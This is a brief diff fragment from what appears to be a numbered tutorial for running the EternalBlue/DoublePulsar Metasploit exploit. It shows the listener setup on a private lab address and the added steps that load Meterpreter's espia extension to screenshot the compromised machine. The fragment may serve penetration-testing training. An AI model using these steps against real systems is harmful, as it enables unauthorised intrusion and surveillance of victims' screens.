@@ -40,3 +40,5 @@ git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
 26.- set lhost 192.168.30.149
 27.- set lport 4444
 28.- run
+29.- use espia
+30.- screengrab
